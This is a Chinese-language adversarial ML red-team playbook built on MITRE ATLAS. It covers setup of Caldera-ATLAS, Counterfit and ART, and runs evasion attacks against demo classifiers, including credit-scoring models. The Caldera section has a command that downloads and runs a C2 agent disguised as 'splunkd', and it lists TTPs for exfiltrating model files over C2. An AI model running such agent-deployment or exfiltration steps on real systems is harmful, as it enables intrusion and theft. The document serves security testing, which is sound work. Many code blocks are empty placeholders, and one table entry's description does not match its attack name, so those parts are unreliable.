# Adversarial ML Playbook（對抗式機器學習作戰手冊）

<p align="left">
  <!-- Meta -->
  <a href="https://atlas.mitre.org/"><img src="https://img.shields.io/badge/MITRE-ATLAS-0B5CAD?style=for-the-badge"></a>
  <a href="https://attack.mitre.org/"><img src="https://img.shields.io/badge/MITRE-ATT%26CK-111827?style=for-the-badge"></a>
  <img src="https://img.shields.io/badge/Category-MLSecOps-6E57E0?style=for-the-badge">
  <img src="https://img.shields.io/badge/Scope-Red%20Team%20%7C%20Adversarial%20ML-EF4444?style=for-the-badge">
  <img src="https://img.shields.io/badge/Status-WIP-F59E0B?style=for-the-badge">
  <img src="https://img.shields.io/badge/Last%20updated-2025--09--12-64748B?style=for-the-badge">
  <br/>

  <!-- Tools -->
  <a href="https://github.com/mitre-atlas/caldera-atlas"><img src="https://img.shields.io/badge/Tool-Caldera%20ATLAS-0F172A?style=for-the-badge"></a>
  <a href="https://github.com/Azure/counterfit/"><img src="https://img.shields.io/badge/Tool-Counterfit-2563EB?style=for-the-badge"></a>
  <a href="https://github.com/Trusted-AI/adversarial-robustness-toolbox"><img src="https://img.shields.io/badge/Tool-ART-1F2937?style=for-the-badge"></a>
  <a href="https://github.com/bethgelab/foolbox"><img src="https://img.shields.io/badge/Tool-Foolbox-374151?style=for-the-badge"></a>
  <a href="https://github.com/mitre/advmlthreatmatrix"><img src="https://img.shields.io/badge/Framework-AdvML%20Threat%20Matrix-334155?style=for-the-badge"></a>
  <br/>

  <!-- Stacks -->
  <img src="https://img.shields.io/badge/Frameworks-TF%20%7C%20PyTorch%20%7C%20Sklearn%20%7C%20XGBoost%20%7C%20LightGBM%20%7C%20MXNet-10B981?style=for-the-badge">
  <img src="https://img.shields.io/badge/Platforms-Kali%20%7C%20Windows%20%7C%20Colab%20%7C%20Docker-14B8A6?style=for-the-badge">
</p>

---
>此專案由本人三個月完成
## 📖 專案簡介

**AI 攻擊手法暨工具整合**是一份把「對抗式機器學習（Adversarial ML）」與「資安紅隊」串起來的實作指南。  
以 **MITRE ATLAS / ATT&CK** 作為威脅模型與術語基準，整理常見攻擊面（Evasion／Extraction／Poisoning／Inference）與對應工具（Caldera-ATLAS、Counterfit、ART、Foolbox…），並提供可重現的 Demo 與安裝步驟。

> 🎯 目標：協助研究員 / 工程師快速完成 **建置 → 攻擊 → 評估 → 防禦** 的完整流程。


---



## Mitre‑atlas

基於 Mitre 框架，[atlas 解說影片](https://www.youtube.com/watch?v=3FN9v-y-C-w)

![](https://hackmd.io/_uploads/r1jLVpUJT.png)
![image](https://hackmd.io/_uploads/Sy2bz9bBa.png)
![image](https://hackmd.io/_uploads/HJX9jcZH6.png)

---

## Methodology（方法論）

> 依攻擊者觀點拆解 ML 目標系統的可利用面與濫用風險。

* **Recon（偵察）**

  * Base Model Discovery（基礎模型發現）
  * Serving Infrastructure（服務基礎架構）
  * Dataset Collection（數據集收集）
* **Model Vulnerabilities（模型漏洞）**

  * Evasion（逃避）
  * Inversion（反轉）
  * Extraction（提取）
  * Poisoning（污染）
  * Membership Inference（成員推斷）
  * Prompt‑Injection（提示注入）
* **Technical Vulnerabilities（技術漏洞）**

  * Lack of Authentication（缺乏認證）
  * Insecure Deserialization（不安全的反序列化）
  * Lack of Input Validation（缺乏輸入驗證）
* **Harm and Abuse（傷害與濫用）**

  * Quality‑of‑Service Harms（服務質量損害）
  * Allocation Harms（分配損害）
  * Inappropriate Use（不當使用）
  * Stereotyping（成見）

---

## ML Dev（機器學習開發）

> 以生命周期視角標註可能的攻擊與防禦切入點。

* **Pre（前期）**

  * Ideation（概念設計）
* **Train Time（訓練階段）**

  * Data Collection（數據收集）
  * Data Processing（數據處理）
  * Model Training（模型訓練）
* **Inference（推論）**

  * Model Evaluation（模型評估）
  * Model Deployment（模型部署）
* **Post（後期）**

  * System Monitoring（系統監控）
  * EOL（生命周期終結）

---

## Tech Stack（技術棧）

> 執行/部署選項概覽。

* **Infra（基礎設施）**

  * Local（本地）
  * Cloud（雲端）

---

## 技術工具和平台

Jupyter ｜ Hugging Face ｜ pandas ｜ CUDA ｜ Torch ｜ Spark ｜ Accelerate ｜ img2dataset ｜ Fairlearn ｜ Alibi ｜ ONNX ｜ Triton ｜ MLFlow ｜ Splunk ｜ Prometheus ｜ S3

---

## Mitre

**按照 Mitre ATT\&CK 框架分為以下攻擊流程**

> 釐清戰術（Tactic）—技術（Technique）—程序（Procedure）的對應，方便在演練或檢測時映射。

| 戰略名稱                                                | 說明              | 常見攻擊手法              | 相關工具 |
| :-------------------------------------------------- | :-------------- | :------------------ | :--- |
| [偵查](https://atlas.mitre.org/tactics/AML.TA0002/)   | 收集目標的資訊         | 掃描、搜索受害者公開資料（社交工程）  | Nmap |
| [資源開發](https://atlas.mitre.org/tactics/AML.TA0003/) | 準備好需要的各種技術資源    | 獲取公開模型、工具收集         | —    |
| [初期存取](https://atlas.mitre.org/tactics/AML.TA0004/) | 摸索入侵途徑的方法       | 網路釣魚、外部遠端服務等        | —    |
| [執行](https://atlas.mitre.org/tactics/AML.TA0000/)   | 執行惡意程式碼和惡意指令的方式 | 腳本、用戶執行、元件物件模型      | —    |
| [持續性](https://atlas.mitre.org/tactics/AML.TA0006/)  | 成功入侵後持續存取       | 外部遠端服務、啟動/登入自動執行    | —    |
| [防禦規避](https://atlas.mitre.org/tactics/AML.TA0007/) | 繞過防禦機制          | 掃描、社工、公開資料濫用        | —    |
| [發現](https://atlas.mitre.org/tactics/AML.TA0008/)   | 窺探內部網段與系統環境     | 獲取公開模型、工具收集         | —    |
| [蒐集](https://atlas.mitre.org/tactics/AML.TA0009/)   | 盜取敏感資料          | 腳本、用戶執行、元件物件模型      | —    |
| [攻擊階段](https://atlas.mitre.org/tactics/AML.TA0001/) | 依對目標的理解定製攻擊     | Poison ML 模型、製作對抗數據 | —    |
| [滲出](https://atlas.mitre.org/tactics/AML.TA0010/)   | 外流敏感資訊          | 藉由 ML API 或網路手段進行滲出 | —    |
| [衝擊](https://atlas.mitre.org/tactics/AML.TA0011/)   | 造成實質危害          | 規避 ML、侵蝕 NL 模型      | —    |

---

## [Adversarial Machine Learning(對抗式攻擊)](https://atlas.mitre.org/resources/adversarial-ml-101/)

> 依攻擊目標（訓練/推論）與成效（逃避/提取/污染/推論）分類，並附對策或工具實作方向。

**底下更細分，以下幾種攻擊，並分成訓練中、模型輸出**

| 攻擊手法                  | 說明                              | 防禦工具或對策                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| :-------------------- | :------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Model Evasion         | Evasion 攻擊對輸入做細微修改，導致模型預測大幅改變。  | boundary、carlini、deepfool、elastic\_net、hop\_skip\_jump、newtonfool、pixel\_threshold、projected\_gradient\_descent\_numpy、saliency\_map、simba、spatial\_transformation、universal\_perturbation、virtual\_adversarial、wasserstein、a2t\_yoo\_2021、bae\_garg\_2019、bert\_attack\_li\_2020、checklist\_ribeiro\_2020、clare\_li\_2020、deepwordbug\_gao\_2018、faster\_genetic\_algorithm\_jia\_2019、genetic\_algorithm\_alzantot\_2018、hotflip\_ebrahimi\_2017、iga\_wang\_2019、input\_reduction\_feng\_2018、kuleshov\_2017、morpheus\_tan\_2020、pruthi\_2019、pso\_zang\_2020、pwws\_ren\_2019、seq2sick\_cheng\_2018\_blackbox、textbugger\_li\_2018、textfooler\_jin\_2019 |
| Functional Extraction | 攻擊者能通過反覆查詢恢復功能等效的模型，離線檢查再進一步攻擊。 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Model Poisoning       | 污染訓練數據以植入後門或重程式化模型；亦可能導致私數據洩露。  |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Model Inversion       | 復原訓練特徵，可能導致成員推論與隱私外洩。           | copycat\_cnn、functionally\_equivalent\_extraction                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Traditional Attacks   | 使用既有 TTP（傳統資安技術）達成目標。           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| common‑corruption     | 常見數據變異（拼字、噪聲、簡單變化…）測試模型韌性。      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Model Inference       | 針對既有模型進行推論測試（黑箱/白箱/僅標籤）。        | black\_box\_rule\_based、label\_only\_boundary\_distance、mi\_face、white\_box\_decision\_tree                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |

---

## [OpenSource Security Tools](https://github.com/RiccardoBiosas/awesome-MLSecOps)

| 工具名稱                                 | 作業系統    | 介紹               | 做了甚麼尚未解決安裝環境問題                       |
| ------------------------------------ | ------- | ---------------- | ------------------------------------ |
| Caldera-Atlas                        | Kali    | 專注於機器學習模型的安全性分析  | - 建置成功, 成功使用 Arsenal 插件, 實際應用上覺得不太適合 |
| Counterfit                           | Windows | 微軟自動化對抗測試工具      | - 建置成功, 展示了一些攻擊方式, 文獻與參數略少           |
| Adversarial Robustness Toolbox (ART) | Colab   | 全面對抗攻擊/防禦與魯棒評估   | - 建置成功, 攻擊多、參考多、參數清晰                 |
| Foolbox                              | Colab   | 對抗性攻擊工具，支援多框架    | - 建置成功, 聚焦攻擊                         |
| CleverHans                           | Colab   | 對抗攻擊與防禦 Python 庫 | \[尚未解決的安裝環境問題]                       |
| SECML                                | Colab   | ML 安全分析研究框架      | \[尚未解決的安裝環境問題]                       |

---

## 工具能用以下幾種

### [caldera-atlas](https://github.com/mitre-atlas/caldera-atlas)

```bash
# git clone 前需要先建立 GitHub SSH 金鑰
$ ssh-keygen
$ cd ~/.ssh
$ cat ~/.ssh/id_rsa.pub  # 印出來
```

![](https://hackmd.io/_uploads/By8JYnDxp.png)

![](https://hackmd.io/_uploads/Hku9F3Dxa.png)

![](https://hackmd.io/_uploads/S15DFhvlT.png)

到[github 金鑰](https://github.com/settings/keys)新增公鑰就好了

```bash
$ git clone --recursive git@github.com:mitre-atlas/caldera-atlas.git
$ cd caldera-atlas
$ sudo docker-compose build  # 沒有的按照指示 pip 下載就可以了
$ sudo docker-compose up -d
```

![](https://hackmd.io/_uploads/S1sElyOxa.png)

這樣就建完了可以連上 [https://localhost:8888/](https://localhost:8888/)
帳號密碼 admin/admin

![](https://hackmd.io/_uploads/HyU5gJ_xa.png)

點選左邊的 Agent 開始部屬靶機

![](https://hackmd.io/_uploads/Bkf1o1OlT.png)

```bash=
$ cd ml-vulhub/envs/example-00-ml-dev

# perform build and initialization steps
$ sudo docker-compose build
$ sudo ./init.sh

$ sudo docker-compose up -d
$ sudo docker-compose exec mldev bash -c 'server=http://host.docker.internal:8888; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download -o splunkd; chmod u+x splunkd; ./splunkd -server $server -group red -v'
```

部屬完就可以上面就會顯示 Alive

![](https://hackmd.io/_uploads/S1XW3kOgT.png)

選擇左邊的 adversaries 可以配置一些手法，如圖中我選 Discovery

![](https://hackmd.io/_uploads/HJ2zC1dlp.png)

選擇左邊的 operations 可以倚靠自己新增的手法，去攻擊測試

![](https://hackmd.io/_uploads/HkKkVlugp.png)

也可以選擇左邊的插件 arsenal 中的攻擊手法

![](https://hackmd.io/_uploads/HJZ58e_lp.png)

**Arsenal 裡面的 TTPs**

1. Create a staging directory for exfiltration. — 為外洩創建一個暫存目錄。
2. Discover GPUs present — 檢測當前存在的 GPU。
3. Find Tensorflow model checkpoint files with the extension: .ckpt — 查找 .ckpt 的 TensorFlow 模型檔案。
4. Search and Stage Tensorflow model files — 搜尋並準備 TensorFlow 模型檔案以進行外洩。
5. Install Python — 安裝 Python。
6. Download and install Python and it’s dependencies (Python 3.7+) — 下載並安裝 Python 及其依賴。
7. Determine Python3 version — 確認 Python3 版本。
8. Determine Python3 is installed and version (Python 3.7+) — 確認 Python3 已安裝與版本。
9. PIP Install Tensorflow‑GPU — 以 PIP 安裝 Tensorflow‑GPU。
10. PIP Install Tensorflow‑CPU — 以 PIP 安裝 Tensorflow‑CPU。
11. CNN Image Classifier — 使用 CNN 圖像分類器。
12. Search for images and apply an image classifier — 搜尋圖像並套用分類器。
13. Compress staged directory — 壓縮已準備好的目錄。
14. Compress a directory on the file system — 壓縮檔案系統中的目錄。
15. Exfiltrate staged directory over the C2 channel — 透過 C2 通道外洩已準備好的目錄。

---

### [counterfit](https://github.com/Azure/counterfit/)

**Microsoft 文章 [內文](https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfi)**

Counterfit 是用於評估機器學習系統安全性的通用自動化層。它把多個對抗框架整合在一個工具下，也能自訂框架。

* 使用系統：Windows
* 需要先安裝 Anaconda Python 和 git。
* 打開 PS / CMD 或 Anaconda shell

```bash
$ conda update -c conda-forge --all -y
```

![](https://hackmd.io/_uploads/B1FkLwcga.png)

```bash
$ conda create --yes -n counterfit python=3.8.0
$ conda activate counterfit
```

![](https://hackmd.io/_uploads/ByKULP9lT.png)

```bash
$ git clone -b main https://github.com/Azure/counterfit.git
```

![](https://hackmd.io/_uploads/BkkoLv5eT.png)

```bash
$ cd counterfit
$ pip install .[dev]
$ counterfit
```

![](https://hackmd.io/_uploads/rJklJqcep.png)

**使用方式**（目標與攻擊清單）

```bash
$list targets   # 目標清單
$list attacks   # 攻擊手法清單（類型、分類）
$help
```

![](https://hackmd.io/_uploads/rJfOe9clT.png)
![](https://hackmd.io/_uploads/S1H0wo9gT.png)
![](https://hackmd.io/_uploads/rkX3139ep.png)

#### 攻擊手段分類

![](https://hackmd.io/_uploads/r1R_eq5lp.png)

| 名稱                                   | 階段            | 類型      | 說明                                   |
| ------------------------------------ | ------------- | ------- | ------------------------------------ |
| black\_box\_rule\_based              | inference(推論) | 圖片、表格   |                                      |
| label\_only\_boundary\_distance      | inference(推論) | 圖片、表格   | 僅用預測**標籤**進行成員推論；許多防禦無法抵禦，需降低過擬合等手段。 |
| mi\_face                             | inference(推論) | 圖片、表格   |                                      |
| white\_box\_decision\_tree           | inference(推論) | unknown |                                      |
| copycat\_cnn                         | inversion(逆向) | 圖片      | 黑箱查詢取得標籤，訓練模仿模型以提取知識。                |
| functionally\_equivalent\_extraction | inversion(逆向) | 圖片、表格   | 僅用標籤即可近乎恢復簡單模型參數，達功能等價。              |
| boundary                             | evasion(規避)   | 圖片、表格   |                                      |
| carlini                              | evasion(規避)   | 圖片、表格   |                                      |
| deepfool                             | evasion(規避)   | 圖片、表格   | 最小擾動使誤判，作為魯棒性評估。                     |
| elastic\_net                         | evasion(規避)   | 圖片、表格   | L1+L2 正則化方向的對抗樣本生成。                  |
| hop\_skip\_jump                      | evasion(規避)   | 圖片、表格   |                                      |
| newtonfool                           | evasion(規避)   | 圖片、表格   |                                      |
| pixel\_threshold                     | evasion(規避)   | 圖片      |                                      |
| projected\_gradient\_descent\_numpy  | evasion(規避)   | 圖片、表格   |                                      |
| saliency\_map                        | evasion(規避)   | 圖片、表格   |                                      |
| simba                                | evasion(規避)   | 圖片      |                                      |
| spatial\_transformation              | evasion(規避)   | 圖片、表格   |                                      |
| universal\_perturbation              | evasion(規避)   | 圖片      |                                      |
| virtual\_adversarial                 | evasion(規避)   | 圖片      |                                      |
| wasserstein                          | evasion(規避)   | 圖片      |                                      |
| a2t\_yoo\_2021…（多種文本攻擊）              | evasion(規避)   | 文本      |                                      |

**攻擊參數說明**

| 參數                        | 說明              |
| ------------------------- | --------------- |
| batch\_size               | 推斷期間估算器使用的批次大小  |
| clip\_values              | 限制輸入值範圍         |
| curr\_iter / max\_iter    | 當前/最大迭代次數       |
| init\_eval / max\_eval    | 梯度估算的初始/最大評估次數  |
| init\_size                | 初始生成對抗樣本的最大嘗試次數 |
| norm                      | 正則化範數（inf、2…）   |
| targeted / target\_labels | 是否為有目標攻擊與其目標標籤  |
| verbose                   | 顯示進度            |

**CFAttack 選項**：sample\_index、optimize、logger …

```bash
counterfit> $set_target satellite           # 設置目標
satellite> $set_attack hop_skip_jump        # 設置攻擊
satellite>HopSkipJump:fb58020f> $set_params --sample_index 5 --norm 2 --max_iter 10 --max_eval 5000 --verbose true
satellite>HopSkipJump:fb58020f> $run        # 開始跑攻擊
```

![](https://hackmd.io/_uploads/S1QIEioea.png)

一開始的圖片

![](https://hackmd.io/_uploads/HJtMSjsxp.png)

訓練出來的圖片，找不到

![](https://hackmd.io/_uploads/HkDdH0n-6.png)

目標設為 creditfraud 時的 bug

![](https://hackmd.io/_uploads/SyjHERhW6.png)

目標設為 digits\_keras 時的 bug

![](https://hackmd.io/_uploads/SJOXKR2ZT.png)

目標設為 digits\_mlp 時的 bug

![](https://hackmd.io/_uploads/Hya_tChWT.png)

目標設為 movie\_reviews 的 demo

```bash
counterfit> $set_target movie_reviews   # 設置目標
satellite> $predict -i range(5)         # 查原始資料
satellite> $set_attack deepwordbug_gao_2018
satellite>HopSkipJump:fb58020f> $set_params --sample_index 3
satellite>HopSkipJump:fb58020f> $run
```

![](https://hackmd.io/_uploads/r1twFb6Wa.png)
![](https://hackmd.io/_uploads/SyC-9bTZp.png)

可以看到圖中有許多訊息

![](https://hackmd.io/_uploads/S1xAUWf6ZT.png)

> 成功率、耗時、查詢數、樣本索引、原/對抗標籤（含信心）、編輯距離%、對抗輸入內容等，用於評估攻擊效果。

---

## [ART](https://github.com/Trusted-AI/adversarial-robustness-toolbox/blob/main/README-cn.md)

對抗性魯棒性工具集（ART）是一個用於機器學習安全性的 Python 庫。由 Linux Foundation AI & Data 維護，支援主流框架與多種資料型別、任務。

### Adversarial Robustness Toolbox (ART) 概覽

**簡介**：提供針對逃避、投毒、提取與推論的評估/防禦/驗證工具。

**支援框架**：TensorFlow（v1/v2）、Keras、PyTorch、MXNet、Scikit‑learn、XGBoost、LightGBM、CatBoost、GPy…

**模型保存格式**：TF `.pb`/SavedModel、Keras `.h5`、PyTorch `.pt`/`.pth`、MXNet `.params`+JSON、Sklearn pickle、XGBoost `.bin`、LightGBM `.txt`/`.bin`、CatBoost `.cbm`…

**攻擊/防禦方法**：包含逃避、投毒、提取、推論等多類；相容性依模型與任務而定。

**安裝方式（colab 範例）**

```
$pip install adversarial-robustness-toolbox
$pip install adversarial-robustness-toolbox[option_name]
# docs / catboost / gpy / keras / lightgbm / mxnet / tensorflow(_image|_audio) / pytorch(_image|_audio) / xgboost / lingvo_asr / all / non_framework
```

**demo** — 下列多語言/多框架程式碼與圖片全部保留（TensorFlow v1、Keras、PyTorch、MXNet、XGBoost、LightGBM ……）

#### tensorflow

```python
<原始程式碼保留>
```

![](https://hackmd.io/_uploads/ByON47Zm6.png)

#### keras

```python
<原始程式碼保留>
```

![image](https://hackmd.io/_uploads/H1xg90ZNa.png)

#### PyTorch

```python
<原始程式碼保留>
```

![image](https://hackmd.io/_uploads/B1UmqAbVT.png)

#### MxNet

```python
<原始程式碼保留>
```

![image](https://hackmd.io/_uploads/Hyqh9Rb4a.png)

#### XGBoost

```python
<原始程式碼保留>
```

![image](https://hackmd.io/_uploads/HkN5aRZ4a.png)

#### LightGBM

```python
<原始程式碼保留>
```

![image](https://hackmd.io/_uploads/rJ2_RA-V6.png)

---

## 四個攻擊面向比較

> PGD（逃避）、Copycat CNN（提取）等：保留原程式與輸出截圖，並在表格中摘要。

```python
<原始程式碼保留>
```

![image](https://hackmd.io/_uploads/S1YwS84ST.png)

```python
<原始程式碼保留>
```

```python
# FastGradientMethod…（原始程式碼保留）
```

#### 分步說明（原文保留並加上小標）

1. 初始化與環境設置
2. 數據載入與預處理
3. 損失函數與優化器
4. 定義與構建模型
5. 訓練模型
6. 轉為 ART 分類器
7. 生成對抗樣本
8. 評估對抗影響

---

## 新加坡模型credit\_scoring test
[這項工作是新加坡金融管理局委託 Veritas 計畫的一部分進行的，目標是加速在金融服務業採用負責任的人工智慧和數據分析 (AIDA)。](https://github.com/veritas-project/phase1/blob/main/credit_scoring/README.md)
其中模型是以Scikit-learn框架的羅吉斯回歸
```bash
$pip install adversarial-robustness-toolbox
$pip install adversarial-robustness-toolbox[tensorflow]
$git clone https://github.com/veritas-project/phase1.git
$pip install scipy==1.5.2
$pip install numpy==1.19.2
$pip install matplotlib==3.3.2
$pip install pandas==1.1.3
$pip install scikit-learn==0.23.2
$pip install imbalanced-learn==0.7.0
$pip install jupyterlab==2.2.6
$pip install pytest==6.1.1
$pip install flake8==3.8.4
```

![image](https://hackmd.io/_uploads/rJKVNoSF6.png)

#### 1. 導入庫和設置

```python

# 導入所需的庫
import os
import json
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.model_selection import StratifiedKFold, cross_validate, cross_val_score
from sklearn.calibration import calibration_curve
from sklearn import metrics
import utils.credit as utils

# Jupyter Notebook 設置
%load_ext autoreload
%autoreload 2
%config InlineBackend.figure_format = 'retina'

```

#### 2. 數據加載和預處理

```python
# 定義要刪除的列
drop_cols = ['ID']

# 從 CSV 文件中加載數據集
X_train, y_train = utils.load_dataset(os.path.join('data', 'creditdata', 'creditdata_train_v2.csv'), drop_columns=drop_cols)
X_test, y_test = utils.load_dataset(os.path.join('data', 'creditdata', 'creditdata_test_v2.csv'), drop_columns=drop_cols)

# 打印數據集信息
print(f"Number of features: {len(X_train.columns)}")
print(f"Train set length: {len(y_train)}, default rate: {round(1 - np.mean(y_train), 4)}")
print(f"Test set length: {len(y_test)}, default rate: {round(1 - np.mean(y_test), 4)}")
print(X_train.columns)
```

![image](https://hackmd.io/_uploads/S1V9NiSYp.png)

#### 3. 邏輯回歸模型
```python
# 定義模型參數
best_regularizer = 1e-1
best_th = 0.43

# 訓練邏輯回歸模型
model = utils.train_log_reg_model(X_train, y_train, seed=0, C=best_regularizer, upsample=True, verbose=True)
```

![image](https://hackmd.io/_uploads/B184vjSK6.png)

#### 4. 模型訓練和評估

```python
# 計算測試集上的性能
def prob_of_good(model, X):
    return model.predict_proba(X)[:, 1] # prob of resolve (good)

test_probs = prob_of_good(model, X_test)
test_preds = np.where(test_probs > best_th, 1, 0)
test_bal_acc = metrics.balanced_accuracy_score(y_test, test_preds)
print(f"Balanced accuracy on test set {round(test_bal_acc, 5)} at threshold {round(best_th, 5)}")

# 繪製 ROC 曲線
def plot_roc(model, X, y):
    figure = plt.figure(figsize=(5,5))
    plt.plot([0, 1], [0, 1], linestyle='--', lw=2, color='r', label='Random Chance', alpha=.8)
    metrics.plot_roc_curve(model, X, y, name='model', alpha=0.3, lw=2, ax=plt.gca())
    plt.title('Receiver Operating Characteristic (ROC) Curve', fontsize=13)
    plt.xlabel('False Positive Rate', fontsize=12)
    plt.ylabel('True Positive Rate', fontsize=12)
    plt.show()

plot_roc(model, X_test, y_test)

```

![image](https://hackmd.io/_uploads/B1eXujSYa.png)
![image](https://hackmd.io/_uploads/rJvHdjHFT.png)
![image](https://hackmd.io/_uploads/SyoLdiHKa.png)

#### 4. 使用 ART 進行對抗性攻擊

**BoundaryAttack**

```python
from art.estimators.classification import SklearnClassifier
from art.attacks.evasion import BoundaryAttack
import warnings
warnings.filterwarnings('ignore')
# 將 Pandas DataFrame 轉換為 NumPy 陣列
X_test_np = X_test.to_numpy()

# 選擇一些樣本進行攻擊
x_test_sample = X_test_np[:10]  # 選擇前10個樣本
y_test_sample = y_test[:10]

# 將邏輯回歸模型封裝成 ART 分類器
model_art = SklearnClassifier(model=model)

# 初始化 Boundary Attack
attack = BoundaryAttack(
    estimator=model_art,
    epsilon=0.1,  # 初始步長
    step_adapt=0.5,  # 步長適應因子
    max_iter=100,  # 最大迭代次數
    num_trial=100,  # 每次迭代的嘗試次數
    sample_size=20,  # 每次試驗的樣本數
    init_size=10,  # 初始生成對抗樣本的最大嘗試次數
    min_epsilon=1e-6,  # 最小扰動
    verbose=True  # 顯示進度條
)

# 執行攻擊
x_test_adv = attack.generate(x=x_test_sample, y=y_test_sample)

# 在對抗性樣本上評估模型性能
predictions = model.predict(x_test_adv)
accuracy = np.sum(predictions == y_test_sample) / len(y_test_sample)
print("對抗樣本的準確率: {:.2f}%".format(accuracy * 100))

```

![image](https://hackmd.io/_uploads/Hyv1UrUKp.png)

**ZooAttack**
![image](https://hackmd.io/_uploads/HJGm8rIY6.png)

bound 100

---

## 新加坡模型customer\_marketing test

#### debug 過程

[colab](https://drive.google.com/file/d/1mg-XulewlApye1N4tuapajBLDGOpwcu5/view?usp=sharing)

🛠️ **錯誤診斷與解決方法**

1. **AttributeError**
   ![image](https://hackmd.io/_uploads/H1woic49p.png)
   Pipeline 缺少 `select`：加入 `PipelineWrapper`。
2. **TypeError**
   ![image](https://hackmd.io/_uploads/rkVCmC4q6.png)
   目標標籤類型不相容，使用 `LabelEncoder` 並處理 `np.isnan` 相關型別。
3. **ImportError**
   ![image](https://hackmd.io/_uploads/S1X6wDPq6.png)
   `ScikitlearnDecisionTreeClassifier` 不存在：暫無解。

##### code（階段性）

**變數說明**：yrej\_ts（測試標籤）、Xts（測試特徵）、y\_pred（預測）、x\_test\_adv（對抗樣本）、y\_targets（定向攻擊目標）、x\_test\_subset / y\_target\_subset（子集）。

```python!
from sklearn.preprocessing import LabelEncoder
import numpy as np
from sklearn.model_selection import cross_validate
from sklearn.metrics import accuracy_score

# 確認 yrej_ts 的類型並適當轉換
# 檢查 yrej_ts 是否為整數類型 (dtype.kind in 'iu' 意味著數據是整數)
if yrej_ts.dtype.kind in 'iu':  
    yrej_ts = yrej_ts.astype(str)  # 將整數類型轉換為字符串類型

# 使用 LabelEncoder 對標籤進行編碼
label_encoder = LabelEncoder()
y_integers = label_encoder.fit_transform(yrej_ts)

# 生成目標標籤，用於定向攻擊
# 變換標籤，使每個類別的標籤改變，以進行定向攻擊
num_classes = len(label_encoder.classes_)  # 獲取標籤的類別數
y_targets = label_encoder.inverse_transform((y_integers + 1) % num_classes)

# 初始化 Boundary Attack，設定攻擊參數
# targeted=True 表示進行定向攻擊
# max_iter 和 num_trial 控制攻擊的迭代次數和每次迭代的嘗試次數
attack = BoundaryAttack(estimator=model_art, targeted=True, max_iter=10, num_trial=5)

# 選擇部分測試樣本進行攻擊
# 這裡僅選取測試集中的前 100 個樣本進行攻擊
x_test_subset = Xts.to_numpy()[:100]
y_target_subset = label_encoder.transform(y_targets)[:100]

# 生成對抗性樣本
x_test_adv = attack.generate(x=x_test_subset, y=y_target_subset)

# 使用 rejclf 在對抗性樣本上進行評估
# 計算對抗性樣本的預測準確率
predictions_adv = rejclf.predict(x_test_adv)
accuracy_adv = np.mean(predictions_adv == yrej_ts[:100])
print("對抗樣本的準確率: {:.2f}%".format(accuracy_adv * 100))

```

##### 準確率比較

* 未攻擊前
  ![image](https://hackmd.io/_uploads/B1XWuAV9a.png)

* boundary
  ![image](https://hackmd.io/_uploads/Hk2rO0VqT.png)

* zooattack
  ![image](https://hackmd.io/_uploads/BJ_Nh0V9a.png)

DeepFool 與 FGSM：因 Sklearn 分類器缺 class gradients / 損失梯度而受限。
ZooAttack 80

* 目的：測量對抗性樣本對模型準確性的影響。
* 主要動作：計算攻擊前後準確率與平均擾動。

![image](https://hackmd.io/_uploads/HJFfuDVHa.png)

| 攻擊類型 | 使用的攻擊方法                    | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 備註                 |
| ---- | -------------------------- | ----------: | ---------: | ------------------ |
| 逃避   | Projected Gradient Descent |        98.1 |       1.98 | 顯著降低準確率            |
| 提取   | Copycat CNN                |       97.87 |      81.94 | 略為降低               |
| 投毒   | Backdoor Attack            |           - |          - | 視標籤一致性/增強/過擬合/評估方式 |
| 推論   | Membership Inference 等     |           - |          - | 主要聚焦隱私而非準確率        |


| 使用的攻擊方法                    | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 平均擾動幅度 | 攻擊內容 |
|-----------------------------------|-------------------|-----------------|------------|---------|
| AutoAttack                        | 93.69             | 0               | 0.16       | 結合了多種不同的攻擊方法。它包括兩種自動調整參數的PGD版本（APGDCE和APGDDLR）、FAB攻擊和Square Attack，形成一個無需設定自由參數的攻擊組合。這種多元化的攻擊策略使得AutoAttack在機器學習模型的安全性評估中非常有效，因為它能夠揭示模型在不同攻擊策略下的潛在弱點。此外，AutoAttack的運行完全自動化，無需任何超參數調整，能夠可靠且成本高效地評估對抗性魯棒性。|
AutoConjugateGradient             | 93.69             | 10              | 0.16       | AutoConjugateGradient 一種特殊的圖像貼片，當這種貼片被放置在物體上時，能夠欺騙神經網絡的圖像識別系統。這些貼片設計成在不同的物理環境下都能有效，並且能夠讓機器學習模型錯誤地將視覺物體分類為特定的錯誤類別。這項技術的關鍵在於創造一種對神經網絡來說非常顯著，但對人類觀察者不易察覺的圖像模式，從而在不被人注意的情況下進行有效的攻擊。 |
|Shadow attack|93.69|10|0.14|為了轉移對抗性攻擊，人們提出了一系列「經過認證的」分類器。除了標記影像之外，經過認證的分類器還會（如果可能）產生一個證書，確保輸入影像不是ℓp-有界對抗性例子。我們提出了一種新的攻擊，它不僅利用分類器的標籤功能，還利用憑證產生器。所提出的方法應用大擾動，使影像遠離類邊界，同時保持對抗性示例的不​​可察覺性。建議的「影子攻擊」會導致可證明穩健的網路對影像進行錯誤標記，並同時產生「欺騙」的穩健性憑證。|
